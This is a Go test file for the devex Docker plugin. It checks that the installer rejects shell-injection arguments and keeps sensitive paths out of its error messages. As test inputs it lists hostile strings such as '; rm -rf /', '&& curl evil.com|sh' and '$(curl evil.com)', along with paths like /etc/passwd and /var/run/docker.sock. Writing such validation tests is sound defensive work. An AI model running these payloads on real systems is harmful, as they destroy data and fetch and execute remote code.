package main_test

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/package-manager-docker"
)

var _ = Describe("Docker Security", func() {
	var (
		dockerInstaller *main.DockerInstaller
	)

	BeforeEach(func() {
		dockerInstaller = main.NewDockerPlugin()
	})

	Describe("Basic Security Validation", func() {
		Context("command argument validation", func() {
			It("should reject malicious docker arguments", func() {
				maliciousArgs := []string{
					"; rm -rf /",
					"&& curl evil.com|sh",
					"|| malicious-command",
					"`rm -rf /`",
					"$(curl evil.com)",
					"|sh",
				}

				for _, arg := range maliciousArgs {
					err := dockerInstaller.Execute("start", []string{arg})
					Expect(err).To(HaveOccurred(),
						"Malicious argument '%s' should be rejected", arg)
				}
			})

			It("should validate shell metacharacters", func() {
				dangerousChars := []string{
					";", "&", "|", "`", "$", "(", ")", "<", ">", "\\",
				}

				for _, char := range dangerousChars {
					testArg := "safe" + char + "dangerous"
					err := dockerInstaller.Execute("run", []string{testArg})
					Expect(err).To(HaveOccurred(),
						"Argument with dangerous character '%s' should be rejected", char)
				}
			})
		})
	})

	Describe("Error Message Security", func() {
		Context("error message sanitization", func() {
			It("should not leak sensitive information in error messages", func() {
				maliciousInputs := []string{
					"/etc/passwd",
					"$HOME/.docker",
					"/root/.bashrc",
					"$(whoami)",
					"/var/run/docker.sock",
				}

				for _, input := range maliciousInputs {
					err := dockerInstaller.Execute("run", []string{input})
					if err != nil {
						errorMsg := err.Error()

						// Error should not contain the raw malicious input
						Expect(errorMsg).NotTo(ContainSubstring(input),
							"Error message should not leak malicious input")

						// Error should not contain sensitive paths
						Expect(errorMsg).NotTo(ContainSubstring("/etc/passwd"))
						Expect(errorMsg).NotTo(ContainSubstring("/root/"))
						Expect(errorMsg).NotTo(ContainSubstring("/.docker/"))
					}
				}
			})

			It("should sanitize command outputs in logs", func() {
				// Test that any command output doesn't contain dangerous content
				err := dockerInstaller.Execute("ps", []string{})

				// This might succeed or fail depending on docker state
				// but should not expose dangerous information
				if err != nil {
					errorMsg := err.Error()
					Expect(errorMsg).NotTo(ContainSubstring("password"))
					Expect(errorMsg).NotTo(ContainSubstring("token"))
					Expect(errorMsg).NotTo(ContainSubstring("secret"))
				}
			})
		})
	})
})
